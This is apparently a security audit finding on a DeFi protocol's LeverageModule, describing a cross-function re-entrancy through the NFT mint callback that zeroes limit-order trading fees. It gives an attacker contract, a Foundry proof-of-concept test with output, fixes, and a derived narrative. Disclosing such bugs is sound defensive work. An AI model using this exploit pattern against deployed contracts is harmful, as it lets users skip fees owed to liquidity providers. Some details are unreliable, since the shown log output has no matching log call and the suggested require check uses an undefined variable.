---
id: 22438
severity: "High"
---

# A malicious user can bypass limit order trading fees via cross-function re-entrancy

## Description

A malicious user can bypass limit order trading fees via cross-function re-entrancy, since _safeMint makes an external call to the user before updating state. In the LeverageModule contract, the _mint function calls _safeMint, which makes an external call to the receiver of the NFT (the to address).

```solidity
function _mint(address _to) internal returns (uint256 _tokenId) {
    _tokenId = tokenIdNext;
    _safeMint(_to, tokenIdNext);
    tokenIdNext += 1;
}
```

Only after this external call, vault.setPosition() is called to create the new position in the vault's storage mapping. This means that an attacker can gain control of the execution while the state of _positions[_tokenId] in FlatcoinVault is not up-to-date.

```solidity
_newTokenId = _mint(_account); // Here, an attack gains control of execution
vault.setPosition( // This updates _positions[_tokenId] in the FlatcoinVault, but after the external call
    FlatcoinStructs.Position({
        lastPrice: entryPrice,
        marginDeposited: announcedOpen.margin,
        additionalSize: announcedOpen.additionalSize,
        entryCumulativeFunding: vault.cumulativeFundingRate()
    }),
    _newTokenId
);
```

ba4f077a64f43fbd565f8983388d0e985cb85db/flatcoin-v1/src/LeverageModule.sol#L111-L121

This outdated state of _positions[_tokenId] can be exploited by an attacker once the external call has been made. They can re-enter LimitOrder::announceLimitOrder() and provide the tokenId that has just been minted. In that function, the trading fee is calculated as follows:

```solidity
uint256 tradeFee = ILeverageModule(vault.moduleAddress(FlatcoinModuleKeys._LEVERAGE_MODULE_KEY)).getTradeFee(
    vault.getPosition(tokenId).additionalSize
);
```

However since the position has not been created yet (due to state being updated after an external call), this results in the tradeFee being 0 since vault.getPosition(tokenId).additionalSize returns the default value of a uint256 (0), and tradeFee = fee * size. Hence, when the limit order is executed, the trading fee (tradeFee) charged to the user will be 0.

A malicious user can bypass the trading fees for a limit order, via cross-function re-entrancy. These trading fees were supposed to be paid to the LPs by increasing stableCollateralTotal, but due to limit orders being able to bypass trading fees (albeit during the same transaction as opening the position), LPs are now less incentivised to provide their liquidity to the protocol.

## Proof of Concept

Summary:
1. A user announces opening a leverage position, calling announceLeverageOpen() via a smart contract which implements IERC721Receiver.
2. Once the keeper executes the order, the contract is called, with the function onERC721Received(address,address,uint256,bytes)
3. The function calls LimitOrder::announceLimitOrder() to create the desired limit order to close the position. (stop loss, take profit levels)
4. The contract then returns msg.sig (the function signature of the executing function) to satisfy the IERC721Receiver's requirement.

To run this proof of concept:
1. Add 2 files AttackerContract.sol and ReentrancyPoC.t.sol to flatcoin-v1/test/unit in the project's repo.
2. run forge test --mt test_tradingFeeBypass -vv in the terminal

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.18;
import {OrderHelpers} from "../helpers/OrderHelpers.sol";
import {FlatcoinStructs} from "../../src/libraries/FlatcoinStructs.sol";
import "forge-std/console2.sol";
import {Setup} from "../helpers/Setup.sol";
import {LimitOrder} from "src/LimitOrder.sol";
contract AttackerContract {
    LimitOrder limitOrderProxy;

    function setLimitOrderProxy(address limitOrderAddress) external {
        limitOrderProxy = LimitOrder(limitOrderAddress);
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns(bytes4) {
        // Do the cross-function re-entrancy
        limitOrderProxy.announceLimitOrder(tokenId, 750e18, 1250e18);
        // Return the function signature (required by the standard)
        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
    }
}
```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.18;
import {OrderHelpers} from "../helpers/OrderHelpers.sol";
import {FlatcoinStructs} from "../../src/libraries/FlatcoinStructs.sol";
import "forge-std/console2.sol";
import {AttackerContract} from "./AttackerContract.sol";
import {Setup} from "../helpers/Setup.sol";
contract ReentrancyPoC is Setup, OrderHelpers {
    function test_tradingFeeBypass() public {
        // Set up and initialize the attacker's contract
        AttackerContract attackerContract = new AttackerContract();
        attackerContract.setLimitOrderProxy(address(limitOrderProxy));

        // Deal the exploiter contract with WETH + ETH
        deal(address(WETH), address(attackerContract), 100_000e18); // Loading account with `token`.
        deal(address(attackerContract), 100_000e18); // Loading account with native token.

        uint256 aliceBalanceBefore = WETH.balanceOf(alice);
        uint256 stableDeposit = 100e18;
        uint256 collateralPrice = 1000e8;

        // Alice provides liquidity
        vm.startPrank(alice);
        announceAndExecuteDeposit({
            traderAccount: alice,
            keeperAccount: keeper,
            depositAmount: stableDeposit,
            oraclePrice: collateralPrice,
            keeperFeeAmount: 0
        });
        vm.stopPrank();

        // Contract opens position: 10 ETH collateral, 30 ETH additional size (4x leverage)
        uint256 tokenId = announceAndExecuteLeverageOpen({
            traderAccount: address(attackerContract),
            keeperAccount: keeper,
            margin: 10e18,
            additionalSize: 30e18,
            oraclePrice: collateralPrice,
            keeperFeeAmount: 0
        });

        // Get the limit order that has been created by the attacker's contract
        FlatcoinStructs.Order memory limitOrderCreated = limitOrderProxy.getLimitOrder(tokenId);

        // Get the order's data
        FlatcoinStructs.LimitClose memory orderData = abi.decode(limitOrderCreated.orderData, (FlatcoinStructs.LimitClose));

        // POC Assertions
        // Assert that the tradeFee for the limit order is 0
        assertEq(orderData.tradeFee, 0);
        // Assert that the price threshold is 750e18, showing that it is not zero, showing that the orderData is not just returning the default values.
        assertEq(orderData.priceLowerThreshold, 750e18);

        // Other Assertions
        // The following assertions are copied from another test in the test suite
        // ERC721 token assertions:
        {
            (uint256 buyPrice, ) = oracleModProxy.getPrice();
            // Position 0:
            FlatcoinStructs.Position memory position0 = vaultProxy.getPosition(tokenId);
            assertEq(position0.lastPrice, buyPrice, "Entry price is not correct");
            assertEq(position0.marginDeposited, 10e18, "Margin deposited is not correct");
            assertEq(position0.additionalSize, 30e18, "Size is not correct");
            assertEq(tokenId, 0, "Token ID is not correct");
        }

        // PnL assertions:
        {
            FlatcoinStructs.PositionSummary memory positionSummary0 = leverageModProxy.getPositionSummary(tokenId);
            uint256 collateralPerShareBefore = stableModProxy.stableCollateralPerShare();
            // Check that before the WETH price change, there is no profit or loss change
            assertEq(positionSummary0.profitLoss, 0, "Pnl for user 0 is not correct");
            assertEq(
                positionSummary0.marginAfterSettlement,
                10e18,
                "Margin after settlement for user 0 is not correct"
            ); // full margin available
        }
    }
}
```
Running 1 test for test/unit/ReentrancyPoC.t.sol:ReentrancyPoC  
[PASS] test_tradingFeeBypass() (gas: 2006498)  
Logs:  
tradeFee: 0  
Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 8.81ms  
Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)

## Recommendation

To fix this specific issue, the following change is sufficient:

```diff
-_newTokenId = _mint(_account);
vault.setPosition(
    FlatcoinStructs.Position({
        lastPrice: entryPrice,
        marginDeposited: announcedOpen.margin,
        additionalSize: announcedOpen.additionalSize,
        entryCumulativeFunding: vault.cumulativeFundingRate()
    }),
-   _newTokenId
+   tokenIdNext
);
+_newTokenId = _mint(_account);
```

However there are still more state changes that would occur after the _mint function (potentially yielding other cross-function re-entrancy if the other contracts were changed) so the optimum solution would be to mint the NFT after all state changes have been executed, so the safest solution would be to move _mint all the way to the end of LeverageModule::executeOpen().

Otherwise, if changing this order of operations is undesirable for whatever reason, one can implement the following check within LimitOrder::announceLimitOrder() to ensure that the positions[_tokenId] is not uninitialized:

```solidity
uint256 tradeFee = ILeverageModule(vault.moduleAddress(FlatcoinModuleKeys._LEVERAGE_MODULE_KEY)).getTradeFee(
    vault.getPosition(tokenId).additionalSize
);
+require(additionalSize > 0, "Additional Size of a position cannot be zero");
```

## Derived Narrative

The following field is derived content and may not be source-grounded:

A cross‑function re‑entrancy vulnerability exists in the LeverageModule contract where the internal _mint function calls _safeMint, which performs an external call to the NFT receiver before the vault.setPosition call updates the position mapping. Because the external call is made prior to persisting the new position, a malicious contract that implements IERC721Receiver can re‑enter the LimitOrder::announceLimitOrder function during the onERC721Received callback and supply the freshly minted tokenId. At that moment vault.getPosition(tokenId).additionalSize returns the default value 0, causing the trade fee calculation (fee * size) to evaluate to zero. Consequently the limit order is executed without any trading fee being collected, violating the protocol’s accounting that expects fees to be added to stableCollateralTotal and distributed to liquidity providers. The bug is triggered only when a limit order is announced in the same transaction that mints the position NFT, and only if the receiver contract is under the attacker’s control. Users experience a situation where they expect a fee to be deducted from their trade but receive none, effectively allowing the attacker to open a leveraged position and close it via a limit order without paying the intended fee. The issue was discovered during a manual audit that inspected the order of state changes and identified that _safeMint performs an external call before the vault’s position storage is updated. It is difficult to notice because the fee calculation appears correct in normal execution paths where the position already exists; the zero‑fee outcome only manifests under the specific re‑entrancy scenario. The vulnerability belongs to the class of re‑entrancy bugs caused by external calls preceding critical state updates, leading to stale or uninitialized data being used in subsequent logic. To remediate, the contract should postpone the NFT minting until after all state changes, such as moving the _mint call to the end of LeverageModule::executeOpen, or alternatively add a guard in LimitOrder::announceLimitOrder that requires the position’s additionalSize to be non‑zero before proceeding. Either approach ensures that the position data is fully initialized before any fee calculation is performed, restoring the intended economic guarantees of the protocol.
